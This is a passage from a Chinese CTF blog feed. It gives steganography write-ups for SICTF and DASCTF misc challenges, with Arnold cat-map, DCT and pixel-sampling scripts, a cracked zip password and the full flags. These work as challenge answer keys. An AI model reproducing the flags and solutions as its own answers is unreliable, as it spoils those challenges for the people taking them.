class="line">树木就是个王八（doge）</span><br></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><p>明明能拿一血，气死了，卡猫脸变化半天，因为我自己的猫脸变化代码不对，最后非常规拿个三血</p><ol><li><code>010editor</code> 打开<code>树木</code>，尾部一眼JPG，你们自己找个脚本了，我用的也是脚本</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118144525245.png" alt="image-20230118144525245"></p><ol start="2"><li>仔细看图片，看到这个小圆圈了没，不说百分百，大概率<code>silenteye</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118144648500.png" alt="image-20230118144648500"></p><ol start="3"><li>将这个图片尾部的pkzip拿出来，里面是<code>pass.txt</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118144755803.png" alt="image-20230118144755803"></p><p>爆破密码为<code>123456</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118144921993.png" alt="image-20230118144921993"></p><ol start="4"><li>打开<code>pass.txt</code>，密码为<code>SI!!!!!!</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118144931511.png" alt="image-20230118144931511"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118145011663.png" alt="image-20230118145011663"></p><ol start="5"><li>保存<code>参数.txt</code>，打开是<code>2, 1, 2</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118145028732.png" alt="image-20230118145028732"></p><ol start="6"><li>下面是<code>flag.bmp</code>，一眼猫脸变化，但是我的猫脸变化代码不对，只有2个参数，我就去找代码了，找了半天没找到，于是选择用我目前的代码选择爆破</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118145057546.png" alt="image-20230118145057546"></p><ol start="7"><li>爆破了很多</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118145234889.png" alt="image-20230118145234889"></p><p>当a&#x3D;1，b&#x3D;3的时候，可以明显看到，基本能看到SIC，我们是SICTF，所以就能慢慢拿到flag</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118145259991.png" alt="image-20230118145259991"></p><p>这是如何看的示例</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118145453051.png" alt="image-20230118145453051"></p><p><strong>SICTF{a9549c89-d261-4bd7-9643-60874dbd28b8}</strong></p><h3 id="补充：-3"><a href="#补充：-3" class="headerlink" title="补充："></a><strong>补充：</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>, choices=[<span class="string">&quot;encode&quot;</span>, <span class="string">&quot;decode&quot;</span>],</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;encode | decode&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入文件名称&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入参数n&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-a&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入参数a&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-b&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入参数b&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold</span>(<span class="params">img, a, b</span>):</span><br><span class="line">    new_img = np.zeros((r, c, <span class="number">3</span>), np.uint8)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c):</span><br><span class="line">                x = (i + b * j) % r</span><br><span class="line">                y = (a * i + (a * b + <span class="number">1</span>) * j) % c</span><br><span class="line">                new_img[x, y] = img[i, j]</span><br><span class="line">        img = np.copy(new_img)</span><br><span class="line">    <span class="keyword">return</span> new_img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dearnold</span>(<span class="params">img, n, a, b</span>):</span><br><span class="line">    new_img = np.zeros((r, c, <span class="number">3</span>), np.uint8)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c):</span><br><span class="line">                x = ((a * b + <span class="number">1</span>) * i - b * j) % r</span><br><span class="line">                y = (-a * i + j) % c</span><br><span class="line">                new_img[x, y] = img[i, j]</span><br><span class="line">        img = np.copy(new_img)</span><br><span class="line">    <span class="keyword">return</span> new_img</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    img_path = os.path.abspath(args.f)</span><br><span class="line">    file_name = os.path.splitext(img_path)[<span class="number">0</span>].split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line">    img = np.array(Image.<span class="built_in">open</span>(img_path), np.uint8)[:,:,::-<span class="number">1</span>]</span><br><span class="line">    r, c = img.shape[:<span class="number">2</span>]</span><br><span class="line">    n, a, b = args.n, args.a, args.b</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.t == <span class="string">&quot;encode&quot;</span>:</span><br><span class="line">        new_img = arnold(img, a, b)</span><br><span class="line">    <span class="keyword">elif</span> args.t == <span class="string">&quot;decode&quot;</span>:</span><br><span class="line">        new_img = dearnold(img, n, a, b)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 图片宽高不一致, 无法进行猫脸变化!&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    cv2.imwrite(<span class="string">f&quot;./<span class="subst">&#123;file_name&#125;</span>_<span class="subst">&#123;n&#125;</span>_<span class="subst">&#123;a&#125;</span>_<span class="subst">&#123;b&#125;</span>.png&quot;</span>, new_img)</span><br></pre></td></tr></table></figure><p>命令：<code>python .\main.py -t decode -f .\flag.bmp -n 2 -a 1 -b 2</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230118172859143.png" alt="image-20230118172859143"></p><br><h2 id="8-F2-Revenge"><a href="#8-F2-Revenge" class="headerlink" title="8. F2 | Revenge |"></a>8. F2 | Revenge |</h2><p><strong>题目描述：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可爱的小猫给你发送了一张图片，并说一定要留意这张图片。</span><br></pre></td></tr></table></figure><p><strong>解题思路：</strong></p><p>轻松拿了个二血，也不错了</p><ol><li>使用<code>zsteg</code>看一下图片，得到<code>Password:SICTF&#123;this_1s_f1ag&#125;</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230119132700798.png" alt="image-20230119132700798"></p><ol start="2"><li>解压zip，得到了<code>key.pyc</code>，使用<code>uncompyle6</code>，逆向一下pyc</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.8.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.7.0 (3394)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.8 (tags/v3.8.8:024d805, Feb 19 2021, 13:18:16) [MSC v.1928 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: encode.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2023-01-17 14:47:26</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 439 bytes</span></span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line">Hg = np.float32(cv2.imread(<span class="string">&#x27;flag.png&#x27;</span>, <span class="number">1</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        Si = randint(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">        Fe = Hg[:, :, Si]</span><br><span class="line">        Mg = cv2.dct(Fe[<span class="number">8</span> * i:<span class="number">8</span> * i + <span class="number">8</span>, <span class="number">8</span> * j:<span class="number">8</span> * j + <span class="number">8</span>])</span><br><span class="line">        <span class="keyword">if</span> secret[(i * <span class="number">64</span> + j)] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            Mg[(<span class="number">7</span>, <span class="number">7</span>)] = <span class="number">20</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> secret[(i * <span class="number">64</span> + j)] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                Mg[(<span class="number">7</span>, <span class="number">7</span>)] = -<span class="number">20</span></span><br><span class="line">        Fe[<span class="number">8</span> * i:<span class="number">8</span> * i + <span class="number">8</span>, <span class="number">8</span> * j:<span class="number">8</span> * j + <span class="number">8</span>] = cv2.idct(Mg)</span><br><span class="line">        Hg[:, :, Si] = Fe</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;flag.png&#x27;</span>, Hg)</span><br><span class="line"><span class="comment"># okay decompiling .\key.pyc</span></span><br></pre></td></tr></table></figure><ol start="3"><li>代码大概意思就是用得到dct，我也不太懂，但是我就知道是8x8的图片范围做<code>cv2.dct</code>，然后如果secret的第一字节是<code>1</code>那<code>cv2.dct</code>后的shape是8x8，然后第8行第8列，也就是最后一行最后一列，变成20</li></ol><p>注意：这个题目他用了一个randit(0, 2)，这个函数就会导致可能是在B通道，可能是在G通道，或者是在R通道，也就是说0的时候是B通道，1的时候是G通道，2的时候是R通道，因为cv2读取图片后就是BGR的通道顺序</p><ol start="4"><li>逆代码如下：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = np.float32(cv2.imread(<span class="string">&#x27;flag.png&#x27;</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">bin_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">for</span> channel <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            channel_img = img[:, :, channel]</span><br><span class="line">            number = cv2.dct(channel_img[<span class="number">8</span> * i:<span class="number">8</span> * i + <span class="number">8</span>, <span class="number">8</span> * j:<span class="number">8</span> * j + <span class="number">8</span>])</span><br><span class="line">            <span class="comment"># print(number[(7, 7)])</span></span><br><span class="line">            <span class="keyword">if</span> number[(<span class="number">7</span>, <span class="number">7</span>)] &gt; <span class="number">10</span>:</span><br><span class="line">                bin_str += <span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> number[(<span class="number">7</span>, <span class="number">7</span>)] &lt; -<span class="number">10</span>:</span><br><span class="line">                bin_str += <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bin_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(bin_str))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="linespan><br><span class="line">4096</span><br></pre></td></tr></table></figure><p>原图是512x512，然后8x8的小范围，所以一共就会有<code>4096 bit</code>，我一开始没做出来，是因为我给的条件是<code>number[(7, 7)] &gt; 15</code>或者&#96;&#96;number[(7, 7)] &lt; -15&#96;，导致出现了很多的没匹配到，后面我看了一下长度不对，我就给代码调整到了10和-10</p><ol start="5"><li>然后2进制转Ascii，发现Base系列字符串</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230119134720746.png" alt="image-20230119134720746"></p><ol start="6"><li>解base系列，base58 –&gt; base32 –&gt; base64</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230119134739974.png" alt="image-20230119134739974"></p><ol start="7"><li>我先拿到<a href="https://quipqiup.com/">quipqiup</a>，进行字母频率的在线工具，原理参考<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E6%AF%8D%E9%A2%91%E7%8E%87">维基百科</a> 或者 <a href="https://www.bilibili.com/video/BV1yF411x7dM/?spm_id_from=333.788&vd_source=60cf53bc00c2d4afa9b53e5b9232bdd2">BiliBili Video</a></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230119134847604.png" alt="image-20230119134847604"></p><p>发现得不到结果，这时候肯定不是简单的单表替换了，大概率是<code>维吉尼亚加密的了</code></p><ol start="8"><li>使用<code>https://www.guballa.de/vigenere-solver</code>进行维吉尼亚密码的爆破</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230119135235572.png" alt="image-20230119135235572"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are a good CTFer because you can solve my challenge,next i will give you a flag,my secret is SICTF&#123;5f9c2024-57ef-4b73-be54-3737e36c2bbb&#125;,hava fun!</span><br></pre></td></tr></table></figure><p><strong>SICTF{5f9c2024-57ef-4b73-be54-3737e36c2bbb}</strong></p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某校赛misc 满屏的QR ＜＜提取图片间隔像素点代码升级版本＞＞</title>
      <link href="/posts/64534.html"/>
      <url>/posts/64534.html</url>
      
        <content type="html"><![CDATA[<p>使用前务必看一下上一篇博文：<a href="https://blog.csdn.net/qq_47875210/article/details/128173378">戳我跳转，学习如何使用！</a></p><br><p><strong>代码如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入文件名称&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入宽度间隔和高度间隔 (如:-n 44x86)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-size&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;1x1&#x27;</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像的大小 (如:-size 7x7)&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.p) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.n) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.size):</span><br><span class="line">        x1, y1 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        x2, y2 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width, height = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.n.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width_size, height_size = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.size.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line"></span><br><span class="line">        img_path = os.path.abspath(args.f)</span><br><span class="line">        file_name = img_path.split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        img = cv2.imread(img_path, cv2.IMREAD_COLOR)</span><br><span class="line">        row, col = img.shape[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">        r, c = <span class="built_in">len</span>(<span class="built_in">range</span>(y1, y2 + <span class="number">1</span>, height)), <span class="built_in">len</span>(<span class="built_in">range</span>(x1, x2 + <span class="number">1</span>, width))</span><br><span class="line">        new_img = np.zeros(shape=(r * height_size, c * width_size, <span class="number">3</span>))</span><br><span class="line">        <span class="keyword">for</span> y, x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(r), <span class="built_in">range</span>(c)):</span><br><span class="line">            <span class="keyword">for</span> y_size <span class="keyword">in</span> <span class="built_in">range</span>(height_size):</span><br><span class="line">                <span class="keyword">for</span> x_size <span class="keyword">in</span> <span class="built_in">range</span>(width_size):</span><br><span class="line">                    new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]</span><br><span class="line"></span><br><span class="line">        cv2.imwrite(<span class="string">f&quot;_<span class="subst">&#123;file_name&#125;</span>&quot;</span>, new_img)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已保存到运行目录中...&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;参数-p或参数-n, 输入错误!&quot;</span>)</span><br></pre></td></tr></table></figure><br><h1 id="满屏的QR解题"><a href="#满屏的QR解题" class="headerlink" title="满屏的QR解题"></a>满屏的QR解题</h1><p>4个红色框框，表示我提取的位置，左上7x7区域，右上7x7区域，左下7x7区域和右下7x7区域。（图片未修改，其实是右下7x7了）</p><h2 id="1-Part1"><a href="#1-Part1" class="headerlink" title="1.Part1"></a>1.Part1</h2><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131200402021.png" alt="image-20230131200402021"></p><br><p>命令1：</p><p><code>python .\main.py -f .\demo\img.png -p 0x0+2499x2499 -n 25x25 -size 7x7</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131200427161.png" alt="image-20230131200427161"></p><br><p>命令2：</p><p><code>python .\main.py -f .\demo\img.png -p 18x0+2499x2499 -n 25x25 -size 7x7</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131200455335.png" alt="image-20230131200455335"></p><br><p>命令3：</p><p><code>python .\main.py -f .\demo\img.png -p 0x18+2499x2499 -n 25x25 -size 7x7</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131200524030.png" alt="image-20230131200524030"></p><br><p>命令4：</p><p><code>python .\main.py -f .\demo\img.png -p 18x18+2499x2499 -n 25x25 -size 7x7</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131204135486.png" alt="image-20230131204135486"></p><blockquote><p>这张图片，目前我们一无所知，暂且放在这里，目前已经得到了 Pat1: <code>DASCTF&#123;F1rst_parT_1s_herE_&amp;&amp;_</code></p></blockquote><br><h2 id="2-Part2"><a href="#2-Part2" class="headerlink" title="2.Part2"></a>2.Part2</h2><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131203827189.png" alt="image-20230131203827189"></p><p>按照这个特征，也就是提取小正方形中间，命令：<code>python .\main.py -f .\demo\img.png -p 18x18+2499x2499 -n 25x25 -size 1x1</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131204336371.png" alt="image-20230131204336371"></p><p>只能说太像二进制了，我们用代码提取一下01序列，列优先的方式读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">&quot;./bin.png&quot;</span>, cv2.IMREAD_GRAYSCALE)</span><br><span class="line">r, c = img.shape</span><br><span class="line"></span><br><span class="line">bin_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(c):</span><br><span class="line"><span class="keyword">if</span> img[y, x] == <span class="number">255</span>:</span><br><span class="line">bin_str += <span class="string">&quot;0&quot;</span></span><br><span class="line"><span class="keyword">elif</span> img[y, x] == <span class="number">0</span>:</span><br><span class="line">bin_str += <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bin_str)</span><br></pre></td></tr></table></figure><p>使用 <code>CyberChef</code> ，如图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131204517796.png" alt="image-20230131204517796"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SeconD_paRt_is_B1nArY_&amp;&amp;     I can also tell you that you should notice the 3 special </span><br><span class="line">colors</span><br></pre></td></tr></table></figure><blockquote><p>得到了 Pat2: <code>SeconD_paRt_is_B1nArY_&amp;&amp;</code></p></blockquote><br><h2 id="3-Part3"><a href="#3-Part3" class="headerlink" title="3.Part3"></a>3.Part3</h2><p>根据Part2的提示，我们可以知道是 <code>colors</code>，那就是颜色，颜色当然想到是颜色频率了</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131201237447.png" alt="image-20230131201237447"></p><p>软件下载链接，<a href="https://github.com/Byxs20/FrequencyColor">戳我！</a></p><p>可以看到很多的杂色，我们直接拖入到颜色频率获取的软件中，上图软件也为我开发的，可以看到有3个颜色的像素最多了，我们把序号写到软件中，然后查看图片即可，如下：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131201728673.png" alt="image-20230131201728673"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230131201739842.png" alt="image-20230131201739842"></p><blockquote><p>得到Part3：<code>_Th1rD_PArT_qRc0De&#125;</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 